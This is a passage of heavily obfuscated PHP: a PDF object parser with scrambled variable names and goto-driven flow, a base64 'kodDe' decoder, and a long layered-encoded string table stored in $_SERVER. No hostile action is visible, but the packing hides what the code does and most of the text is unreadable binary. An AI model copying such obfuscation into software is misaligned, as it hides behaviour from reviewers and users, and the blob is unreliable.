intval($E‹ŒšµÆºÛ[2][$f»èñÌ‹Çå]); $d¯†™½íï[$CÉö½Õà‚Š[1525]][$AÄ™¸‡’Êó] = intval($E‹ŒšµÆºÛ[1][$f»èñÌ‹Çå]); ++$BÆ¹øÛö´ç; } else { if ($E‹ŒšµÆºÛ[3][$f»èñÌ‹Çå] == $CÉö½Õà‚Š[1529]) { ++$BÆ¹øÛö´ç; } else { } } } if (preg_match_all($CÉö½Õà‚Š[1530], $D³®ïƒ•ÌÅ, $E‹ŒšµÆºÛ)) { $d–‘‘”ÊÃ = $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[77]] - $b¤ÖºÌ‘Ãê[$CÉö½Õà‚Š[1503]]; foreach ($E‹ŒšµÆºÛ[0] as $f»èñÌ‹Çå => $dŒğ®èæÉŸ) { $FŸåÆ­Ãƒ = $E‹ŒšµÆºÛ[1][$f»èñÌ‹Çå] . $CÉö½Õà‚Š[70] . $E‹ŒšµÆºÛ[2][$f»èñÌ‹Çå]; $d¯†™½íï[$CÉö½Õà‚Š[1525]][$FŸåÆ­Ãƒ] = strpos($D³®ïƒ•ÌÅ, $dŒğ®èæÉŸ) + $d–‘‘”ÊÃ + 1; } } if (preg_match_all($CÉö½Õà‚Š[1531], $D³®ïƒ•ÌÅ, $E‹ŒšµÆºÛ)) { $eÚÀ×Ì˜²° = count($E‹ŒšµÆºÛ[1]) == 1 ? $E‹ŒšµÆºÛ[1][0] : $E‹ŒšµÆºÛ[1][1]; } else { $eÚÀ×Ì˜²° = substr($D³®ïƒ•ÌÅ, -1024 * 5); } goto F‹œµàğ‰; DåĞ·Å¸¶È: } private static function getObjectValue($BĞ„‡ˆÀõ, $B†øÈ¦±¶ñ, $Fë³·ßÔñ) { goto a›ãĞŞ­„Ö; a‰—ÅÂ¢ˆõ: if (!is_array($D„Æ‚õ´˜[1])) { return array(); } $BŠ¾Šêùïõ = array(); for ($Bê¿»¯ ®Æ = 0; $Bê¿»¯ ®Æ < count($D„Æ‚õ´˜[1]); $Bê¿»¯ ®Æ += 2) { $Aæâ†Ÿ‹¾ = $D„Æ‚õ´˜[1][$Bê¿»¯ ®Æ]; $d¶·ñºìÉ = $D„Æ‚õ´˜[1][$Bê¿»¯ ®Æ + 1]; if (count($Aæâ†Ÿ‹¾) == 3 && $Aæâ†Ÿ‹¾[0] == $B¼½Ñ˜Ö©Ò[8]) { $c·Æğ¾ˆ¯ = !1; if ($d¶·ñºìÉ[0] == $B¼½Ñ˜Ö©Ò[1540]) { $d¶·ñºìÉ = self::getObject($BĞ„‡ˆÀõ, $B†øÈ¦±¶ñ[$B¼½Ñ˜Ö©Ò[1525]][$d¶·ñºìÉ[1]]); } $c·Æğ¾ˆ¯ = $d¶·ñºìÉ[1]; if ($c·Æğ¾ˆ¯ === !1) { continue; } if (is_string($c·Æğ¾ˆ¯)) { $c·Æğ¾ˆ¯ = self::decodeStr($c·Æğ¾ˆ¯); } $BŠ¾Šêùïõ[$Aæâ†Ÿ‹¾[1]] = $c·Æğ¾ˆ¯; } } goto d²ÀÓ¨”ˆˆ; a›ãĞŞ­„Ö: $B¼½Ñ˜Ö©Ò =& $_SERVER[¢à]; $D„Æ‚õ´˜ = self::getObject($BĞ„‡ˆÀõ, $B†øÈ¦±¶ñ[$B¼½Ñ˜Ö©Ò[1525]][$Fë³·ßÔñ]); if (is_string($D„Æ‚õ´˜[1])) { return $D„Æ‚õ´˜[1]; } goto a‰—ÅÂ¢ˆõ; d²ÀÓ¨”ˆˆ: return $BŠ¾Šêùïõ; goto aÊ»©Ã‹ã–; aÊ»©Ã‹ã–: } private static function getObject($bæŒÔÍˆ¥², $d…œñ¿££§) { $dÁØ™›Â­‘ = self::getObjectItem($bæŒÔÍˆ¥², $d…œñ¿££§); $dÁØ™›Â­‘ = self::getObjectItem($bæŒÔÍˆ¥², $dÁØ™›Â­‘[2]); return $dÁØ™›Â­‘; } private static function getObjectItem($eÙÊ’Õê‰Ô, $DßÈÚ¢’ˆ) { goto e›ä Ç’¸Ë; aâõÎ²ñÉ÷: $d£¿É£öôö = self::getRawObject($a»”‡¹ºÖ, $E²Â„ŒİšŞ); if ($DßÈÚ¢’ˆ >= $Cæº ¨¡½) { $d£¿É£öôö[2] = $d£¿É£öôö[2] + $Cæº ¨¡½; } else { if ($DßÈÚ¢’ˆ > $bÑ„ƒó†ÈÍ && $DßÈÚ¢’ˆ <= $Cæº ¨¡½) { $d£¿É£öôö[2] = $d£¿É£öôö[2] + $DßÈÚ¢’ˆ; } } return $d£¿É£öôö; goto Fâõ‚‚¤•¦; a‹…´ï·­‘: $E²Â„ŒİšŞ = $DßÈÚ¢’ˆ >= $Cæº ¨¡½ ? $DßÈÚ¢’ˆ - $Cæº ¨¡½ : $DßÈÚ¢’ˆ; $a»”‡¹ºÖ = $DßÈÚ¢’ˆ >= $Cæº ¨¡½ ? $eÙÊ’Õê‰Ô[$d†³Äºê—[1505]] : $eÙÊ’Õê‰Ô[$d†³Äºê—[1504]]; if ($DßÈÚ¢’ˆ > $bÑ„ƒó†ÈÍ && $DßÈÚ¢’ˆ <= $Cæº ¨¡½) { $E²Â„ŒİšŞ = 0; $a»”‡¹ºÖ = StreamWrapperIO::read($eÙÊ’Õê‰Ô[$d†³Äºê—[75]], $DßÈÚ¢’ˆ, $bÑ„ƒó†ÈÍ); } goto aâõÎ²ñÉ÷; e›ä Ç’¸Ë: $d†³Äºê— =& $_SERVER[¢à]; $bÑ„ƒó†ÈÍ = $eÙÊ’Õê‰Ô[$d†³Äºê—[1503]]; $Cæº ¨¡½ = $eÙÊ’Õê‰Ô[$d†³Äºê—[77]] - $bÑ„ƒó†ÈÍ; goto a‹…´ï·­‘; Fâõ‚‚¤•¦: } private static function decodeStr($F™‡º²Ÿ·±) { goto e‚‹¾¡‹—; cå©¤±Ãğ¹: $F™‡º²Ÿ·± = $bñÁ’ÔÌÉõ[33]; foreach ($Fã„ªÖõ· as $CµõƒĞ¤¸) { if (preg_match($bñÁ’ÔÌÉõ[1555], $CµõƒĞ¤¸) && !1 === stripos($CµõƒĞ¤¸, $bñÁ’ÔÌÉõ[1556])) { $CµõƒĞ¤¸ = preg_replace($bñÁ’ÔÌÉõ[1557], $bñÁ’ÔÌÉõ[33], $CµõƒĞ¤¸); $CµõƒĞ¤¸ = trim($CµõƒĞ¤¸, $bñÁ’ÔÌÉõ[924]); $CµõƒĞ¤¸ = pack($bñÁ’ÔÌÉõ[1558], $CµõƒĞ¤¸); $F™‡º²Ÿ·± .= $CµõƒĞ¤¸; } else { $F™‡º²Ÿ·± .= $CµõƒĞ¤¸; } } if (preg_match($bñÁ’ÔÌÉõ[1559], $F™‡º²Ÿ·±)) { $d¿–•ÆÇÒÇ = substr($F™‡º²Ÿ·±, 2); $F™‡º²Ÿ·± = $bñÁ’ÔÌÉõ[33]; $a«ôÆŠêö÷ = strlen($d¿–•ÆÇÒÇ); for ($A¼œª›ˆ¨ó = 0; $A¼œª›ˆ¨ó < $a«ôÆŠêö÷; $A¼œª›ˆ¨ó += 2) { $fİ…«Öáæ… = hexdec(bin2hex(substr($d¿–•ÆÇÒÇ, $A¼œª›ˆ¨ó, 2))); $F™‡º²Ÿ·± .= mb_convert_encoding($bñÁ’ÔÌÉõ[1560] . intval($fİ…«Öáæ…) . $bñÁ’ÔÌÉõ[67], $bñÁ’ÔÌÉõ[1561], $bñÁ’ÔÌÉõ[1562]); } } goto eÌùø¸Â‹ò; aë÷Ïïëê“: $F™‡º²Ÿ·± = $bñÁ’ÔÌÉõ[33]; foreach ($Fã„ªÖõ· as $CµõƒĞ¤¸) { if (preg_match($bñÁ’ÔÌÉõ[1552], $CµõƒĞ¤¸)) { $F™‡º²Ÿ·± .= \chr(hexdec(trim($CµõƒĞ¤¸, $bñÁ’ÔÌÉõ[1553]))); } else { $F™‡º²Ÿ·± .= $CµõƒĞ¤¸; } } $Fã„ªÖõ· = preg_split($bñÁ’ÔÌÉõ[1554], $F™‡º²Ÿ·±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto cå©¤±Ãğ¹; eÌùø¸Â‹ò: return $F™‡º²Ÿ·±; goto CÜ„èŠ„ì„; Fá¥ ÓÆ—: $F™‡º²Ÿ·± = $bñÁ’ÔÌÉõ[33]; foreach ($Fã„ªÖõ· as $CµõƒĞ¤¸) { if (preg_match($bñÁ’ÔÌÉõ[1550], $CµõƒĞ¤¸)) { $F™‡º²Ÿ·± .= \chr(octdec(trim($CµõƒĞ¤¸, $bñÁ’ÔÌÉõ[95]))); } else { $F™‡º²Ÿ·± .= $CµõƒĞ¤¸; } } $Fã„ªÖõ· = preg_split($bñÁ’ÔÌÉõ[1551], $F™‡º²Ÿ·±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto aë÷Ïïëê“; e‚‹¾¡‹—: $bñÁ’ÔÌÉõ =& $_SERVER[¢à]; $F™‡º²Ÿ·± = str_replace(array($bñÁ’ÔÌÉõ[1541], $bñÁ’ÔÌÉõ[1542], $bñÁ’ÔÌÉõ[1543], $bñÁ’ÔÌÉõ[1544], $bñÁ’ÔÌÉõ[1545], $bñÁ’ÔÌÉõ[1546], $bñÁ’ÔÌÉõ[1547], $bñÁ’ÔÌÉõ[1548]), array($bñÁ’ÔÌÉõ[95], $bñÁ’ÔÌÉõ[50], $bñÁ’ÔÌÉõ[8], $bñÁ’ÔÌÉõ[245], $bñÁ’ÔÌÉõ[815], $bñÁ’ÔÌÉõ[214], $bñÁ’ÔÌÉõ[988], $bñÁ’ÔÌÉõ[327]), $F™‡º²Ÿ·±); $Fã„ªÖõ· = preg_split($bñÁ’ÔÌÉõ[1549], $F™‡º²Ÿ·±, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Fá¥ ÓÆ—; CÜ„èŠ„ì„: } private static function getRawObject($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï = 0) { goto BÖÙ›…ï¶; aŒ‘‘¼Ü­‹: return array($Fà˜ŒÔ¾è, $aŠˆ‚˜Æ»Š, $AÉ•±ÌŸƒï); goto DÆï–‰¢Êî; b¼¿‚Œ«ãã: $AÉ•±ÌŸƒï += strspn($FãÈÔ°Ü‚œ, $A¿³ˆâÜ[1563], $AÉ•±ÌŸƒï); $c¥¼Ëå¯Ê· = $FãÈÔ°Ü‚œ[$AÉ•±ÌŸƒï]; switch ($c¥¼Ëå¯Ê·) { case $A¿³ˆâÜ[1564]: $CÍØÎ³…ù» = strcspn($FãÈÔ°Ü‚œ, $A¿³ˆâÜ[1565], $AÉ•±ÌŸƒï); if ($CÍØÎ³…ù» > 0) { $AÉ•±ÌŸƒï += $CÍØÎ³…ù»; return self::getRawObject($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï); } break; case $A¿³ˆâÜ[8]: $Fà˜ŒÔ¾è = $c¥¼Ëå¯Ê·; ++$AÉ•±ÌŸƒï; $CÄïñİÅŸ‹ = preg_match($A¿³ˆâÜ[1566], substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 256), $f›¯¡¼Ó‹¹); if (1 == $CÄïñİÅŸ‹) { $aŠˆ‚˜Æ»Š = $f›¯¡¼Ó‹¹[1]; $AÉ•±ÌŸƒï += strlen($aŠˆ‚˜Æ»Š); } break; case $A¿³ˆâÜ[245]: case $A¿³ˆâÜ[815]: $Fà˜ŒÔ¾è = $c¥¼Ëå¯Ê·; ++$AÉ•±ÌŸƒï; $Cé‚„‹ñï = $AÉ•±ÌŸƒï; if ($A¿³ˆâÜ[245] == $c¥¼Ëå¯Ê·) { $bÒâé³ËÊ¹ = 1; while ($bÒâé³ËÊ¹ > 0) { if (!isset($FãÈÔ°Ü‚œ[$Cé‚„‹ñï])) { break; } $d¿Ñß¯‚Ë = $FãÈÔ°Ü‚œ[$Cé‚„‹ñï]; switch ($d¿Ñß¯‚Ë) { case $A¿³ˆâÜ[95]: ++$Cé‚„‹ñï; break; case $A¿³ˆâÜ[245]: ++$bÒâé³ËÊ¹; break; case $A¿³ˆâÜ[815]: --$bÒâé³ËÊ¹; break; } ++$Cé‚„‹ñï; } $aŠˆ‚˜Æ»Š = substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, $Cé‚„‹ñï - $AÉ•±ÌŸƒï - 1); $AÉ•±ÌŸƒï = $Cé‚„‹ñï; } break; case $A¿³ˆâÜ[154]: case $A¿³ˆâÜ[472]: $Fà˜ŒÔ¾è = $c¥¼Ëå¯Ê·; ++$AÉ•±ÌŸƒï; if ($A¿³ˆâÜ[154] == $c¥¼Ëå¯Ê·) { $aŠˆ‚˜Æ»Š = array(); do { $b”ğäœÁÎ¼ = $AÉ•±ÌŸƒï; $cåØ§É‘‘Œ = self::getRawObject($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï); $AÉ•±ÌŸƒï = $cåØ§É‘‘Œ[2]; $aŠˆ‚˜Æ»Š[] = $cåØ§É‘‘Œ; } while ($A¿³ˆâÜ[472] != $cåØ§É‘‘Œ[0] && $AÉ•±ÌŸƒï != $b”ğäœÁÎ¼); array_pop($aŠˆ‚˜Æ»Š); } break; case $A¿³ˆâÜ[923]: case $A¿³ˆâÜ[926]: if (isset($FãÈÔ°Ü‚œ[$AÉ•±ÌŸƒï + 1]) && $FãÈÔ°Ü‚œ[$AÉ•±ÌŸƒï + 1] == $c¥¼Ëå¯Ê·) { $Fà˜ŒÔ¾è = $c¥¼Ëå¯Ê· . $c¥¼Ëå¯Ê·; $AÉ•±ÌŸƒï += 2; if ($A¿³ˆâÜ[923] == $c¥¼Ëå¯Ê·) { $aŠˆ‚˜Æ»Š = array(); do { $b”ğäœÁÎ¼ = $AÉ•±ÌŸƒï; $cåØ§É‘‘Œ = self::getRawObject($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï); $AÉ•±ÌŸƒï = $cåØ§É‘‘Œ[2]; $aŠˆ‚˜Æ»Š[] = $cåØ§É‘‘Œ; } while ($A¿³ˆâÜ[1567] != $cåØ§É‘‘Œ[0] && $AÉ•±ÌŸƒï != $b”ğäœÁÎ¼); array_pop($aŠˆ‚˜Æ»Š); } } else { $Fà˜ŒÔ¾è = $c¥¼Ëå¯Ê·; ++$AÉ•±ÌŸƒï; $CÄïñİÅŸ‹ = preg_match($A¿³ˆâÜ[1568], substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï), $f›¯¡¼Ó‹¹); if ($A¿³ˆâÜ[923] == $c¥¼Ëå¯Ê· && 1 == $CÄïñİÅŸ‹) { $aŠˆ‚˜Æ»Š = strtr($f›¯¡¼Ó‹¹[1], $A¿³ˆâÜ[1569], $A¿³ˆâÜ[33]); $AÉ•±ÌŸƒï += \strlen($f›¯¡¼Ó‹¹[0]); } elseif (!1 !== ($aÀäïìãê = strpos($FãÈÔ°Ü‚œ, $A¿³ˆâÜ[926], $AÉ•±ÌŸƒï))) { $AÉ•±ÌŸƒï = $aÀäïìãê + 1; } } break; default: if ($A¿³ˆâÜ[1570] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 6)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1570]; $AÉ•±ÌŸƒï += 6; } elseif ($A¿³ˆâÜ[101] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 4)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[101]; $AÉ•±ÌŸƒï += 4; $aŠˆ‚˜Æ»Š = $A¿³ˆâÜ[101]; } elseif ($A¿³ˆâÜ[1571] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 4)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1572]; $AÉ•±ÌŸƒï += 4; $aŠˆ‚˜Æ»Š = $A¿³ˆâÜ[1571]; } elseif ($A¿³ˆâÜ[1573] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 5)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1572]; $AÉ•±ÌŸƒï += 5; $aŠˆ‚˜Æ»Š = $A¿³ˆâÜ[1573]; } elseif ($A¿³ˆâÜ[1574] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 6)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1574]; $AÉ•±ÌŸƒï += 6; if (1 == preg_match($A¿³ˆâÜ[1575], substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï), $f›¯¡¼Ó‹¹)) { $AÉ•±ÌŸƒï += strlen($f›¯¡¼Ó‹¹[0]); $C™šš‡«ó = $A¿³ˆâÜ[1576]; $CÄïñİÅŸ‹ = preg_match($C™šš‡«ó, substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï), $f›¯¡¼Ó‹¹, PREG_OFFSET_CAPTURE); if (1 == $CÄïñİÅŸ‹) { $aŠˆ‚˜Æ»Š = substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, $f›¯¡¼Ó‹¹[0][1]); $AÉ•±ÌŸƒï += $f›¯¡¼Ó‹¹[1][1]; } } } elseif ($A¿³ˆâÜ[1577] == substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 9)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1577]; $AÉ•±ÌŸƒï += 9; } elseif (1 == preg_match($A¿³ˆâÜ[1578], substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 33), $f›¯¡¼Ó‹¹)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1540]; $AÉ•±ÌŸƒï += strlen($f›¯¡¼Ó‹¹[0]); $aŠˆ‚˜Æ»Š = intval($f›¯¡¼Ó‹¹[1]) . $A¿³ˆâÜ[70] . intval($f›¯¡¼Ó‹¹[2]); } elseif (1 == preg_match($A¿³ˆâÜ[1579], substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, 33), $f›¯¡¼Ó‹¹)) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1580]; $aŠˆ‚˜Æ»Š = intval($f›¯¡¼Ó‹¹[1]) . $A¿³ˆâÜ[70] . intval($f›¯¡¼Ó‹¹[2]); $AÉ•±ÌŸƒï += strlen($f›¯¡¼Ó‹¹[0]); } elseif (($fç‘ç‰…¤¢ = strspn($FãÈÔ°Ü‚œ, $A¿³ˆâÜ[1581], $AÉ•±ÌŸƒï)) > 0) { $Fà˜ŒÔ¾è = $A¿³ˆâÜ[1582]; $aŠˆ‚˜Æ»Š = substr($FãÈÔ°Ü‚œ, $AÉ•±ÌŸƒï, $fç‘ç‰…¤¢); $AÉ•±ÌŸƒï += $fç‘ç‰…¤¢; } break; } goto aŒ‘‘¼Ü­‹; BÖÙ›…ï¶: $A¿³ˆâÜ =& $_SERVER[¢à]; $Fà˜ŒÔ¾è = $A¿³ˆâÜ[33]; $aŠˆ‚˜Æ»Š = $A¿³ˆâÜ[33]; goto b¼¿‚Œ«ãã; DÆï–‰¢Êî: } } goto C«éœ¬İ‰‚; DÜÎ§–‰: if (!function_exists('_kodDe')) { function _kodDe($bÃ¦ôÉ«¿‡) { $bÃ¦ôÉ«¿‡ = base64_decode($bÃ¦ôÉ«¿‡); $e™Ü°ŠµùŸ = strlen($bÃ¦ôÉ«¿‡); $FøÎ”÷ôó = ''; $aáç¯ÓšŞƒ = ord($bÃ¦ôÉ«¿‡[0]) - 30; for ($FäøãÈ›óî = 1; $FäøãÈ›óî < $e™Ü°ŠµùŸ; $FäøãÈ›óî += 2) { if ($FäøãÈ›óî + 1 < $e™Ü°ŠµùŸ) { $FøÎ”÷ôó .= chr(ord($bÃ¦ôÉ«¿‡[$FäøãÈ›óî + 1]) + $aáç¯ÓšŞƒ); $FøÎ”÷ôó .= chr(ord($bÃ¦ôÉ«¿‡[$FäøãÈ›óî]) + $aáç¯ÓšŞƒ); } else { $FøÎ”÷ôó .= chr(ord($bÃ¦ôÉ«¿‡[$FäøãÈ›óî]) + $aáç¯ÓšŞƒ); } } return $FøÎ”÷ôó; } } define("\xa2\xe0", "\263\250\241"); $_SERVER[¢à] = explode("\174\1\174\4\174\2", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x7c\x1b\xc5\xf5\x30\x47\x5b\x48\x80\x42\x4b\x39\x5a\x28\x2c\x4e\x82\x8f\xe8\xb0\x1d\xe7\x72\x62\x3b\xb2\x24\xc7\x22\xb6\x25\x24\x39\x4e\x62\x19\x65\x25\xad\xa4\x8d\x25\xad"."\274\273\222\154\307\1\12\41\224\102\50\51\107\71\323\102\200\66\264\234\205\162\25\12\24\50\20\112\12\5\12\5\112\71\222\24\150\103\113\377\100\51\107\277\271\147\166\45\323\366\343\207\243\231\67\157"."\146\347\170\363\346\315\314\173\157\316\270\352\247\37\117\355\73\365\205\251\375\76\333\376\177\267\377\364\241\363\160\144\152\177\360\367\105\34\76\376\334\3\367\101\377\355\237\77\371\301\201\375\132\16\353\157".strrev('ı×¾)~o÷mv”ãı×CĞÊeñxÿ;£–ïz¹ú.ëüm¯GÜç;æŞ¬õösÇı[™“å;')."\301\320\315\53\317\350\151\370\351\352\355\363\23\217\317\212\277\267\317\143\223\107\337\163\364\225\256\337\77\41\155\275\243\271\162\323\73\63\317\116\275\364\154\307\3\367\154\374\355\322\215\47\336\370\366\327"."\xef\x7b\xee\x1b\x53\xef\x9e\xf6\x93\xb\x7f\xf1\x4c\xe4\xd6\x7b\x5e\x3c\x6a\xce\x29\xc9\x7d\xde\xbd\x71\xf9\xb7\xdf\x3d\x64\x53\xe7\xe3\xfb\xff\xf3\xa6\xd6\xaf\x96\xff\x6f\xc7\x59\xa7\x1f\xb6\xbb\xbc\xff\xa6\x70\xf7\xbe\x6b".base64_decode('5r3wrWV/3P7x4DVdxz987tGPh6PDtyjXfv2EI1fWnfqNncHbP3z/lq9e/n7dEyeqT239mfnE9W8=')."\135\271\371\250\31\352\367\157\271\355\270\333\256\71\357\231\123\177\367\344\257\74\227\54\275\345\305\265\235\236\317\276\167\360\213\15\23\336\367\126\135\374\354\125\143\77\73\373\312\365\333\16\176\145\336\271"."\247\314\170\257\375\216\223\147\264\266\356\267\307\363\267\3\337\374\364\310\375\337\230\173\335\153\343\317\37\347\336\366\334\45\73\166\113\77\70\150\317\303\257\254\377\323\107\313\177\171\343\343\317\36\172\345".base64_decode('FT9UHMt++oHjAb9yyNy7tjz30U71y7Pu2Nh/9sYFt90afvGNjQ/ceffNfzkj+Ez8JdcrF7y63z4=').base64_decode('++CObsc/UkEzJWVcNUwDA5JaIa1mcFgt4F83/jHGcqqp4HB8IBiNRwZDIX84Gicliul5LUVCRVk=').base64_decode('l/Ok8KKiG+BTYnHxolZUChYIB6RkU07IBinJ1x33+UN9wdXx6OqQn2Ak4mMlRZ/AMRSMmLJuRtU=')."\xbc\xc2\x30\x2a\x3a\xab\x57\xb7\x7f\x79\x60\x40\x8a\x86\x3d\x3\x11\x8f\x37\x1a\x8\xe\x60\xb0\x37\xd8\xdf\x1f\x88\x56\xc3\xc3\xc1\xbe\xbe\x6e\x8f\x77\x45\x75\x4a\x28\xec\x59\xde\xef\x91\x40\xfd\x72\x4a\x5c\x2d\xa4\xb5\x6"."\x69\x2d\x4e\x59\x2b\x35\xe2\x40\x8f\xaa\xe4\x52\x38\x58\x90\x69\x75\xcc\x89\x22\x9\x45\x59\x8\x8c\x41\xa1\x94\xcb\xe1\xc8\x0\xb\x91\xfa\x2b\x69\xb9\x94\x23\x7d\xe6\x13\x23\x45\x5d\xcd\xcb\xb4\xe9\x2b\x94\x9\x6\xc5\x1"."\271\144\152\152\41\211\43\376\161\123\227\71\34\324\70\251\53\171\245\100\212\212\370\373\374\336\250\4\253\51\365\204\203\375\22\31\212\274\154\230\212\56\15\365\372\303\176\11\126\275\243\36\265\270\136\302".base64_decode('+QYHQIdInr4+aboSTCVfpMXgPDUKC4Z9/rDUvVri/ZTU8nmt4AKlgPE0har6w2EccBAK7gvAoSM=')."\221\140\117\117\304\317\142\244\161\47\367\201\232\314\43\124\152\211\245\322\71\63\136\226\163\45\112\254\243\370\267\236\374\220\137\315\40\4\74\246\26\324\22\41\126\122\204\246\261\231\103\2\45\212\255\120"."\110\36\144\323\310\234\2\23\254\214\203\35\235\370\167\11\101\112\304\141\232\242\233\161\245\220\324\122\152\201\114\303\56\62\345\10\341\311\146\326\247\253\0\217\24\250\271\222\132\161\242\137\53\223\66\244"."\xd5\x9c\xd2\xc7\x66\x59\x5a\xcb\xa5\x14\x9d\xc7\x8b\x20\xbb\x98\x42\x1a\xa3\x4e\xa\xb9\x7\x4a\x79\x11\x85\x45\x93\x59\x35\x97\xd2\xe9\xe4\xfc\x3c\xcc\x16\x52\xac\x62\x9a\xa0\x19\x6\xad\xe9\x60\x31\xa7\xc9\xa9\x88\xa2\xb"."\265\357\1\305\4\113\246\10\54\41\264\36\115\317\373\0\3\40\275\3\310\136\35\254\221\60\112\11\77\45\164\12\56\201\16\236\67\133\52\214\106\130\23\135\204\253\65\14\177\313\371\331\310\360\62\360"."\117\43\141\161\61\122\357\254\222\313\305\225\161\205\314\236\174\152\276\101\233\346\66\22\152\301\15\40\70\32\10\306\263\262\221\355\117\315\217\243\134\224\163\246\224\161\127\61\133\44\23\234\315\151\102\326".strrev('VyšËï8\'¤Õ'."\0".'Î”í«¶õ-Z_©)HsåšBŠŠë¨'."\n".'U¦ÚC]‚¥‹4ÖR	”–œŞ0/Ó4p')._kodDe('LJBWfyj+syb4+7nGZ6qDYCQQhIiDpRYApKT4VpWPmPp9G/1lCERcRyjSn4TIVJj/LElFRFbPTPsE')."\322\6\234\313\115\70\27\235\107\136\255\140\202\211\354\214\352\162\301\110\53\272\323\117\10\275\135\2\235\312\170\31\105\363\251\106\121\63\124\370\231\166\111\66\115\71\231\205\174\200\27\337\361\71\370\152"."\41\247\26\224\52\134\117\62\251\30\206\23\146\321\265\234\323\223\313\151\25\147\120\127\63\52\310\323\144\253\46\340\121\355\22\145\240\105\125\127\14\32\225\226\367\107\11\62\250\225\342\14\351\162\46\57"."\267\113\305\122\2\364\14\231\251\65\140\30\233\174\275\135\112\302\250\103\312\227\14\323\251\53\200\21\251\140\311\43\203\27\110\73\373\341\170\252\112\312\31\1\374\232\200\347\65\267\111\200\164\44\232\206"."\241\275\321\150\50\36\350\1\313\362\200\77\336\357\211\172\173\111\265\115\71\103\353\334\7\270\60\53\222\2\127\71\301\344\203\204\66\0\372\210\3\103\132\105\321\301\207\273\47\332\245\121\55\225\320\306".base64_decode('XTQJIsPJRJFhjxZNZ1guZGD/JCZMhZCjUc7Q5SW80h+OR4I90SFPmCzdBdDl47RQWEjOGVZSoJM=')."\x93\x26\x2d\x5a\x2e\xc2\xfe\xa1\x38\x70\x4a\xc0\xd1\xa4\xa9\x70\x9a\xd0\xb4\xbe\xc0\x72\xd8\x5\x3e\xa7\x1\x90\x9c\x22\x16\x2d\xbb\x4f\xcd\xab\xb0\x96\x26\x4b\x41\x7d\x6\xd6\xf5\xe5\xa4\x42\x6e\x54\xf5\x8e\x58\xb6\xa9\x21"."\226\232\333\350\4\377\66\65\16\307\174\256\246\221\56\267\312\363\270\133\134\55\122\153\363\2\51\4\4\15\125\316\111\204\136\252\60\232\245\340\12\53\105\365\51\205\214\231\45\262\127\330\177\362\240\77".base64_decode('Eo33+6O9QR/J7feQUJ+GJxit7TD+GSHjAJb+jJLUcpou5yDroFSj0KmcUdOcTweAgEI6DTMrHok=')."\250\371\42\145\63\146\266\224\117\10\101\67\57\201\214\50\30\16\306\134\64\266\246\150\72\11\265\273\111\226\71\255\75\224\77\272\43\363\300\377\234\31\246\264\274\114\45\113\64\375\224\24\236\177\30\324"."\144\111\351\125\144\276\110\231\272\251\101\250\156\101\351\127\314\254\106\246\101\106\241\125\52\261\272\321\132\246\224\234\102\173\51\253\320\325\1\210\113\145\326\171\105\135\111\253\204\46\201\174\4\340\234\227"."\252\106\30\144\202\362\12\215\17\101\261\222\3\114\316\166\145\203\263\156\30\21\126\332\236\301\276\276\270\67\70\20\5\242\45\206\14\205\3\121\77\245\10\217\57\356\361\206\330\252\303\207\211\40\300\111"."\126\315\244\60\244\334\52\160\157\316\346\71\343\244\153\23\144\214\70\14\70\132\121\53\30\212\63\111\112\113\161\26\212\61\226\330\370\147\125\16\56\320\216\73\345\374\244\63\257\230\262\223\125\335\272\112"."\111\121\161\171\16\220\41\340\54\57\7\226\103\260\137\240\113\142\50\30\41\31\272\40\24\110\27\11\105\47\365\10\15\222\244\274\60\374\313\375\4\70\223\256\160\62\221\104\74\103\21\312\256\112\0\137"."\x57\x27\x65\xde\xc6\x2e\x5a\x1f\x52\xf6\x78\x3e\xc7\x5\xa6\xb8\x6a\x19\xbf\xb8\x96\x58\x7\x38\x14\x20\x3a\xb9\x56\xab\x9d\x7c\xac\xa2\xbd\x81\x81\x15\xf1\xfe\xa0\xcf\xdf\x17\xf\xc\x0\x16\x18\xad\x86\xf\x86\x7c\x1e\x3a"."\370\42\274\73\30\355\265\100\7\1\237\130\351\351\13\330\321\375\253\2\221\150\244\146\22\200\15\372\155\51\140\13\25\12\373\173\2\253\130\264\47\340\357\363\105\342\136\217\267\227\343\14\170\372\111\44"."\x9e\x86\x9b\x18\xc3\x6d\xc5\x8f\x3\x6e\x1e\x61\x5b\xa1\x78\x19\x6e\xeb\x68\x67\xc6\x2d\xfb\x8e\x38\x95\xa8\xe3\x9c\x4e\xc0\x12\xa4\x10\xda\x24\xcd\x85\x9b\x49\xd4\x12\x22\xe3\x26\xb5\x12\xa5\x56\x26\x77\xe5\x29\x83\xc8\xcb"."\144\206\312\164\171\151\300\77\215\222\47\42\231\305\70\143\5\